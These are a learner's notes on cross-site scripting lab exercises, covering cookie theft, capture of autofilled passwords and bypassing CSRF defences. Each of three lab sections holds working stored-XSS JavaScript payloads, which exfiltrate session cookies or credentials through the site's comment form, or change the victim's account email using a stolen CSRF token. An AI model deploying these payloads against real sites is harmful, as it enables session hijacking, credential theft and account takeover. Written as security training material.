# Exploiting cross-site scripting vulnerabilities
- The traditional way to prove that you've found a cross-site scripting vulnerability is to create a popup using the alert() function. 
- This isn't because XSS has anything to do with popups; it's simply a way to prove that you can execute arbitrary JavaScript on a given domain. 
- You might notice some people using alert(document.domain). 
- This is a way of making it explicit which domain the JavaScript is executing on.
- Sometimes you'll want to go further and prove that an XSS vulnerability is a real threat by providing a full exploit. 
- In this section, we'll explore three of the most popular and powerful ways to exploit an XSS vulnerability.

# Exploiting cross-site scripting to steal cookies
- Stealing cookies is a traditional way to exploit XSS. 
- Most web applications use cookies for session handling. 
- You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.
- In practice, this approach has some significant limitations:
    - The victim might not be logged in.
    - Many applications hide their cookies from JavaScript using the HttpOnly flag.
    - Sessions might be locked to additional factors like the user's IP address.
    - The session might time out before you're able to hijack it.

# LAB: Exploiting cross-site scripting to steal cookies
- This lab contains a stored XSS vulnerability in the blog comments function. 
- A simulated victim user views all comments after they are posted. 
- To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.
- To  solve this lab, We need to use burp collaborator, But unfotunately, I don't have burpsuite.
- I was able to see someone who used CSRF to solve the LAB
- Yeah CSRF! When a site is vulnerable to XSS no csrf protection can save it
- Here is the final code I used:
```
<script>
    window.addEventListener("DOMContentLoaded", function() {
        
        var csrfToken = document.getElementsByName("csrf")[0].value;
        var myform = new FormData();

        myform.append("csrf",  csrfToken)
        myform.append("postId", 2)
        myform.append("comment", document.cookie)
        myform.append("name", "You have been hacked")
        myform.append("email", "bybeejay@email.com")
        myform.append("website", "https://bybeejay.com")

        fetch("/post/comment", {
            method: "POST",
            mode: "no-cors",
            body: myform
        })
    })
</script>
```
- This code made it easy to get the cookie session from the victim user.

# Exploiting cross-site scripting to capture passwords
- These days, many users have password managers that auto-fill their passwords. 
- You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain. 
- This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password.
- The primary disadvantage of this technique is that it only works on users who have a password manager that performs password auto-fill. 
- (Of course, if a user doesn't have a password saved you can still attempt to obtain their password through an on-site phishing attack, but it's not quite the same.)

# Lab: Exploiting cross-site scripting to capture passwords
- This lab contains a stored XSS vulnerability in the blog comments function. 
- A simulated victim user views all comments after they are posted. 
- To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.
- This lab is on the basis that victim users have password autofill on
- To solve this lab we can solve without using collaborator, we have to use csrf to solve this lab too
- Here is the CSRF code
```
<input type="text" name="username" placeholder="Enter Username">
<input type="password" name="password" placeholder="Enter Password" onchange="fillPassword()">

<script>
    function fillPassword() {
        var csrfToken = document.getElementsByName('csrf')[0].value;
        var username = document.getElementsByName('username')[0].value;
        var password =  document.getElementsByName('password')[0].value;

        var formData = new FormData();
        formData.append('csrf', csrfToken);
        formData.append('postId', 8);
        formData.append('comment', `${username} : ${password}`)
        formData.append('name', 'Victimized');
        formData.append('email', 'bee.mali.com');
        formData.append('webiste', 'https://example.com');

        fetch('/post/comment', {
            method: 'POST',
            mode: 'no-cors',
            body: formData,

        })
    }
</script>
```

# Exploiting cross-site scripting to bypass CSRF protections
- XSS enables an attacker to do almost anything a legitimate user can do on a website. 
- By executing arbitrary JavaScript in a victim's browser, XSS allows you to perform a wide range of actions as if you were the victim user. 
- For example, you might make a victim send a message, accept a friend request, commit a backdoor to a source code repository, or transfer some Bitcoin.
- Some websites allow logged-in users to change their email address without re-entering their password. - If you've found an XSS vulnerability on one of these sites, you can exploit it to steal a CSRF token. With the token, you can change the victim's email address to one that you control. 
- You can then trigger a password reset to gain access to the account.
- This type of exploit combines XSS (to steal the CSRF token) with the functionality typically targeted by CSRF. 
- While traditional CSRF is a "one-way" vulnerability, where the attacker can induce the victim to send requests but cannot see the responses, XSS enables "two-way" communication. 
- This enables the attacker to both send arbitrary requests and read the responses, resulting in a hybrid attack that bypasses anti-CSRF defenses.

# Note
- CSRF tokens are ineffective against XSS because XSS lets attackers read token values directly from responses.

# Lab: Exploiting XSS to bypass CSRF defenses
- This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.
```
<script>
    window.addEventListener("DOMContentLoaded", function() {
        
        var csrfToken = document.getElementsByName("csrf")[0].value;
        var myform = new FormData();

        myform.append("email", "bybeejay@email.com")
        myform.append("csrf",  csrfToken)

        fetch("/my-account/change-email", {
            method: "POST",
            mode: "no-cors",
            body: myform
        })
    })
</script>
```
- The lab was solved on first attempt, thanks to the previous lab and new knowledge of CSRF